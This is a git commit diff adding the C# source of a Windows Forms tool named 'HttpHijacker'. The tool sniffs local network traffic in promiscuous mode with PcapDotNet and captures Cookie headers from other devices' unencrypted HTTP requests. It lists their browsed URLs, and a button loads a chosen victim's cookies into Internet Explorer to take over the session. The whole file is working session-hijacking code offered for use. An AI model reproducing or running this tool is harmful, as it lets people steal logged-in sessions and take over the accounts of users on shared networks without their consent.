8853c600d1c63870b2b0585dc4f47cdb32259063
baibaomen <baibaomen@gmail.com>
2017-05-16 19:40:20 +0800

    Workable.

---
+++ Baibaomen.HttpHijacker/FormHijacker.Designer.cs
@@ -0,0 +1,103 @@
+﻿namespace Baibaomen.HttpHijacker
+{
+    partial class FormHijacker
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.lbMsg = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.btnHijack = new System.Windows.Forms.Button();
+            this.lstSessions = new System.Windows.Forms.ListBox();
+            this.SuspendLayout();
+            // 
+            // lbMsg
+            // 
+            this.lbMsg.AutoSize = true;
+            this.lbMsg.ForeColor = System.Drawing.Color.RoyalBlue;
+            this.lbMsg.Location = new System.Drawing.Point(13, 10);
+            this.lbMsg.Name = "lbMsg";
+            this.lbMsg.Size = new System.Drawing.Size(88, 13);
+            this.lbMsg.TabIndex = 7;
+            this.lbMsg.Text = "正在启动监听...";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(10, 38);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(144, 13);
+            this.label1.TabIndex = 6;
+            this.label1.Text = "监听到的HTTP会话列表：";
+            // 
+            // btnHijack
+            // 
+            this.btnHijack.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
+            this.btnHijack.Location = new System.Drawing.Point(360, 278);
+            this.btnHijack.Name = "btnHijack";
+            this.btnHijack.Size = new System.Drawing.Size(139, 49);
+            this.btnHijack.TabIndex = 5;
+            this.btnHijack.Text = "劫持选中HTTP会话";
+            this.btnHijack.UseVisualStyleBackColor = true;
+            this.btnHijack.Click += new System.EventHandler(this.btnHijack_Click);
+            // 
+            // lstSessions
+            // 
+            this.lstSessions.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+            | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.lstSessions.FormattingEnabled = true;
+            this.lstSessions.Location = new System.Drawing.Point(13, 63);
+            this.lstSessions.Name = "lstSessions";
+            this.lstSessions.Size = new System.Drawing.Size(486, 199);
+            this.lstSessions.TabIndex = 4;
+            // 
+            // FormHijacker
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(511, 339);
+            this.Controls.Add(this.lbMsg);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.btnHijack);
+            this.Controls.Add(this.lstSessions);
+            this.Name = "FormHijacker";
+            this.Text = "Http Hijacker";
+            this.Load += new System.EventHandler(this.FormHijacker_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label lbMsg;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Button btnHijack;
+        private System.Windows.Forms.ListBox lstSessions;
+    }
+}
+
---
+++ Baibaomen.HttpHijacker/FormHijacker.cs
@@ -0,0 +1,167 @@
+﻿using PcapDotNet.Core;
+using PcapDotNet.Packets;
+using System;
+using System.Collections.Concurrent;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Baibaomen.HttpHijacker
+{
+    public partial class FormHijacker : Form
+    {
+        /// <summary>
+        /// 被嗅探到的各个设备的cookie集合。
+        /// </summary>
+        ConcurrentDictionary<string, ConcurrentDictionary<string, string>> clientCookies = new ConcurrentDictionary<string, ConcurrentDictionary<string, string>>();
+
+        /// <summary>
+        /// 本地网卡绑定的IP列表。
+        /// </summary>
+        List<string> localAddresses = new List<string>();
+
+        public FormHijacker()
+        {
+            InitializeComponent();
+        }
+
+        private void FormHijacker_Load(object sender, EventArgs e)
+        {
+            StartHijack();
+        }
+        
+        public void StartHijack()
+        {
+            Task.Run(delegate {
+                IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
+
+                if (allDevices.Count == 0)
+                {
+                    MessageBox.Show("未找到网卡。请确认已安装WinPcap。");
+                    return;
+                }
+
+                foreach (var selectedDevice in allDevices)
+                {
+                    Task.Run(delegate
+                    {
+                        PacketCommunicator communicator =
+                            selectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000);
+                        if (communicator.DataLink.Kind != DataLinkKind.Ethernet)
+                        {
+                            return;
+                        }
+
+                        using (BerkeleyPacketFilter filter = communicator.CreateFilter("tcp and dst port 80"))
+                        {
+                            communicator.SetFilter(filter);
+                        }
+                        communicator.ReceivePackets(0, PacketHandler);
+                    });
+                }
+
+                this.BeginInvoke(new EventHandler(delegate {
+                    lbMsg.Text = "监听已启动";
+                }));
+            });
+        }
+
+        private void PacketHandler(Packet packet)
+        {
+            try
+            {
+                var sourceIP = packet.Ethernet.IpV4.Source.ToString();
+                
+                if (sourceIP == "192.168.1.103")
+                    return;
+
+                var http = packet?.Ethernet?.IpV4?.Tcp?.Http;
+                if (http == null || http.Header == null) return;
+
+                if (http.IsRequest && http.IsValid)
+                {
+                    String msg = http.Decode(Encoding.UTF8);
+
+                    //只截获网页正文请求。
+                    if (!string.IsNullOrEmpty(msg))
+                    {
+                        var lines = msg.Split(new string[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
+                        var host = lines.FirstOrDefault(x => x.StartsWith("Host: "))?.Substring("Host: ".Length);
+                        var cookie = lines.FirstOrDefault(x => x.StartsWith("Cookie: "))?.Substring("Cookie: ".Length);
+
+                        if (string.IsNullOrEmpty(host)) return;
+
+                        if (!string.IsNullOrEmpty(cookie))
+                        {
+                            var cCookies = clientCookies.GetOrAdd(sourceIP, new ConcurrentDictionary<string, string>());
+                            cCookies.AddOrUpdate(host, cookie, (key, oldVal) => cookie);
+                        }
+
+                        if (msg.StartsWith("GET ") && (msg.Contains("\nAccept: text/html") || msg.Contains("\nAccept: text/plain")))//筛除对资源文件等的请求，让数据更干净。
+                        {
+                            var pathAndQuery = lines[0].Substring(0, lines[0].LastIndexOf(" HTTP/")).Substring("GET ".Length);
+                            this.BeginInvoke(new EventHandler(delegate {
+                                lstSessions.Items.Insert(0, $"{sourceIP}\t{DateTime.Now}\thttp://{host + pathAndQuery}");
+                            }));
+                        }
+                    }
+                }
+            }
+            catch//可能嗅探数据不完整，丢弃。
+            {
+            }
+        }
+
+        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern bool InternetSetCookie(string lpszUrlName, string lbszCookieName, string lpszCookieData);
+
+        private void btnHijack_Click(object sender, EventArgs e)
+        {
+            var selected = lstSessions.SelectedItem;
+
+            if (selected == null)
+            {
+                MessageBox.Show("请选择待劫持会话");
+                return;
+            }
+
+            var segments = selected.ToString().Split('\t');
+            var ip = segments[0];
+            var url = segments[2];
+
+            var cookies = clientCookies[ip];
+
+            foreach (var domainCookie in cookies) //将cookie设置为浏览的cookie 
+            {
+                foreach (var item in domainCookie.Value.Split(';'))
+                {
+                    try
+                    {
+                        var name = item.Substring(0, item.IndexOf('=')).Trim();
+                        var value = item.Substring(item.IndexOf('=') + 1);
+
+                        InternetSetCookie(
+                             "http://" + domainCookie.Key,
+                             name,
+                             value + ";expires=" + DateTime.UtcNow.AddMinutes(10).ToString("R"));
+                    }
+                    catch { }//有不符合格式的数据。可能嗅探数据不完整，丢弃。
+                }
+            }
+
+            if (lstSessions.SelectedItem != null)
+            {
+                Process.Start("iexplore.exe", url);
+            }
+        }
+
+    }
+}
